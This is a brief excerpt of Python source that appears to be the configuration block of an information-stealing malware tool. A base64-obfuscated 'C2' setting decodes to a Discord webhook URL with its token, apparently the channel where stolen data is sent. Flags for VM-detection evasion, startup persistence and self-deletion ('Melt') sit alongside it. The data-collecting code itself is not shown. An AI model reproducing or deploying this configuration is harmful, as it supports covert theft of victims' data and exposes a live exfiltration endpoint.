...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3MDE0MDU0NDE1NjE3NjQyNC9VZnQwQ1JUbnpDWjRGWjJpcGl2TUpHY2FhdDhtc09EZFZGbDJGRFREUk5OR19TMXBqVWptYWJTdDhrR2Itd1R5bGIteA==').decode())
    Mutex = base64.b64decode('cWJqb2lndFAxN1NETFY2ag==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
...
Logger = logging.getLogger('Polymophya')
